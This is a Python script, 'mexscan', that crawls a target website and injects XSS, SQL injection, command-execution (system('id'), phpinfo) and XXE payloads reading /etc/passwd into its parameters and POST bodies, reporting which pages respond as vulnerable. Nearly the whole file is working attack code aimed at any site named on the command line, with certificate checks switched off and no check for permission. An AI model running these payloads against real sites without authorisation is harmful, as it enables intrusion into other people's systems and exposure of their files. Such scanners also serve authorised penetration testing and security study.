#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mexscan - All-in-One Web Exploitation & Vulnerability Scanner
Author: Bug Hunter
Purpose: Scan, detect, and exploit XSS, SQLi, RCE, and XXE from root domain
"""

import requests
import re
import os
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import threading
import time
import random
import sys
import warnings

# ========== CONFIGURATION ==========
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
HEADERS = {"User-Agent": USER_AGENT}
TIMEOUT = 10
CRAWL_LIMIT = 100
PROXIES = {}
requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ========== PAYLOADS ==========
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg/onload=alert('xss')>"
]
SQLI_PAYLOADS = ["' OR 1=1--", "\" OR 1=1--"]
RCE_PAYLOADS = [";phpinfo();", ";system('id');"]
XXE_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
"""

# ========== RESULTS ==========
found_xss = []
found_sqli = []
found_rce = []
found_xxe = []

# ========== UTILITY FUNCTIONS ==========
def get_links(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, proxies=PROXIES, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        return list(set([urljoin(url, a.get("href")) for a in soup.find_all("a", href=True)]))
    except:
        return []

def inject_params(url, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if not query:
        return url  # No parameters to inject
    new_query = {k: [payload] for k in query}
    return parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()

# ========== SCANNER FUNCTIONS ==========
def scan_xss(url):
    for payload in XSS_PAYLOADS:
        test_url = inject_params(url, payload)
        if test_url == url:
            continue
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, proxies=PROXIES, verify=False)
            if payload in r.text:
                print(f"[+] XSS Found: {test_url}")
                found_xss.append(test_url)
        except:
            continue

def scan_sqli(url):
    for payload in SQLI_PAYLOADS:
        test_url = inject_params(url, payload)
        if test_url == url:
            continue
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, proxies=PROXIES, verify=False)
            if any(keyword in r.text.lower() for keyword in ["mysql", "syntax", "error in your sql"]):
                print(f"[+] SQLi Found: {test_url}")
                found_sqli.append(test_url)
        except:
            continue

def scan_rce(url):
    for payload in RCE_PAYLOADS:
        test_url = inject_params(url, payload)
        if test_url == url:
            continue
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, proxies=PROXIES, verify=False)
            if "uid=" in r.text or "phpinfo" in r.text:
                print(f"[+] RCE Found: {test_url}")
                found_rce.append(test_url)
        except:
            continue

def scan_xxe(url):
    try:
        r = requests.post(url, data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"}, timeout=TIMEOUT, proxies=PROXIES, verify=False)
        if "root:x:" in r.text:
            print(f"[+] XXE Found: {url}")
            found_xxe.append(url)
    except:
        pass

# ========== CRAWLER ==========
def crawler(base):
    visited = set()
    to_visit = [base]
    while to_visit and len(visited) < CRAWL_LIMIT:
        current = to_visit.pop(0)
        if current in visited or not current.startswith(base):
            continue
        visited.add(current)
        print(f"[*] Crawling: {current}")
        scan_xss(current)
        scan_sqli(current)
        scan_rce(current)
        scan_xxe(current)
        links = get_links(current)
        to_visit += [l for l in links if l not in visited]

# ========== MAIN ==========
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 mexscan.py http://example.com")
        sys.exit(1)
    target = sys.argv[1]
    crawler(target)

    print("\n================= SCAN COMPLETE =================")
    print(f"XSS Found: {len(found_xss)}")
    print(f"SQLi Found: {len(found_sqli)}")
    print(f"RCE Found: {len(found_rce)}")
    print(f"XXE Found: {len(found_xxe)}")
